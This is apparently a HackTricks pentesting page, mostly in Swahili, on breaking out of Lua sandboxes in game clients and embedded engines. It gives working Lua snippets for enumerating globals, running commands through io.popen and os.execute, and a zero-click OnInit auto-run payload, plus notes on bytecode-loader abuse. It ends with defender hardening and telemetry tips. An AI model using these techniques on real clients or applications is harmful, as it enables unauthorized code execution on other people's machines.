# Kuvuka Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ukurasa huu unakusanya mbinu za vitendo za kuorodhesha na kuvunja kutoka kwa Lua "sandboxes" zilizowekwa ndani ya applications (hasa game clients, plugins, au in-app scripting engines). Engines nyingi zinaonyesha mazingira ya Lua yaliyodhibitiwa, lakini huacha globals zenye nguvu zikifikiwa ambazo zinawezesha utekelezaji wa amri chochote au hata uharibifu wa native memory wakati bytecode loaders zinapofichuliwa.

Mawazo muhimu:
- Tumia VM kama mazingira yasiyojulikana: orodhesha _G na gundua ni dangerous primitives gani zinazoweza kufikiwa.
- Wakati stdout/print imezuiwa, tumia yoyote in-VM UI/IPC channel kama output sink ili kuona matokeo.
- Ikiwa io/os zimeonyeshwa, mara nyingi una direct command execution (io.popen, os.execute).
- Ikiwa load/loadstring/loadfile zimeonyeshwa, kutekeleza crafted Lua bytecode kunaweza kupindua memory safety katika baadhi ya toleo (≤5.1 verifiers are bypassable; 5.2 removed verifier), ikiruhusu advanced exploitation.

## Enumerate the sandboxed environment

- Dump the global environment to inventory reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ikiwa print() haipatikani, tumia tena in-VM channels. Mfano kutoka kwenye MMO housing script VM ambapo chat output hufanya kazi tu baada ya sound call; yafuatayo huunda kazi ya kutoa inayoweza kuaminika:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Fanya mfano huu uwe wa jumla kwa lengo lako: textbox yoyote, toast, logger, au UI callback inayokubali strings inaweza kutumika kama stdout kwa reconnaissance.

## Direct command execution ikiwa io/os imefunuliwa

Ikiwa sandbox bado inafichua standard libraries io au os, kuna uwezekano kwamba una immediate command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Vidokezo:
- Utekelezaji hufanyika ndani ya client process; tabaka nyingi za anti-cheat/antidebug ambazo zinazuia external debuggers hazitazuia in-VM process creation.
- Pia angalia: package.loadlib (kupakia DLL/.so yoyote), require na native modules, LuaJIT's ffi (ikiwa ipo), na debug library (inaweza kuongeza idhini ndani ya VM).

## Zero-click triggers via auto-run callbacks

Ikiwa host application inatuma scripts kwa clients na VM inaonyesha auto-run hooks (mfano, OnInit/OnLoad/OnEnter), weka payload yako huko kwa drive-by compromise mara script inapoanza:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Callback sawa yoyote (OnLoad, OnEnter, etc.) huifanya tekniki hii kuwa ya jumla wakati scripts zinapotumwa na kutekelezwa kwenye client kwa otomatiki.

## Viambato hatari vya kutafuta wakati wa recon

Wakati wa kuorodhesha _G, tazama hasa kwa:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: kutekeleza source au bytecode; inaunga mkono kupakia bytecode isiyothibitishwa.
- package, package.loadlib, require: upakiaji wa dynamic library na uso wa module.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, na hooks.
- LuaJIT-only: ffi.cdef, ffi.load kwa kuita native code moja kwa moja.

Mifano ya matumizi ya chini (ikiwa inafikiwa):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Kupandisha hiari: kutumia vibaya Lua bytecode loaders

Wakati load/loadstring/loadfile zinapatikana lakini io/os zimepunguzwa, utekelezaji wa crafted Lua bytecode unaweza kusababisha memory disclosure na corruption primitives. Mambo muhimu:
- Lua ≤ 5.1 ililetwa na bytecode verifier yenye bypasses zinazojulikana.
- Lua 5.2 ilitoa verifier kabisa (msimamo rasmi: applications zinapaswa kukataa tu precompiled chunks), ikipanua attack surface ikiwa bytecode loading haifungwi.
- Workflows kawaida: leak pointers via in-VM output, craft bytecode kuunda type confusions (mf., karibu na FORLOOP au opcodes nyingine), kisha pivot kwa arbitrary read/write au native code execution.

Njia hii ni engine/version-specific na inahitaji RE. Angalia references kwa deep dives, exploitation primitives, na mifano ya gadgetry katika games.

## Vidokezo vya ugunduzi na ugumu (kwa watetezi)

- Upande wa server: kataa au andika upya user scripts; allowlist safe APIs; ondoa au bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Upande wa client: endesha Lua na minimal _ENV, kataza bytecode loading, reintroduce strict bytecode verifier au signature checks, na zuia process creation kutoka client process.
- Telemetry: toa alert juu ya gameclient → child process creation muda mfupi baada ya script load; linganisha na matukio ya UI/chat/script.

## Marejeo

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
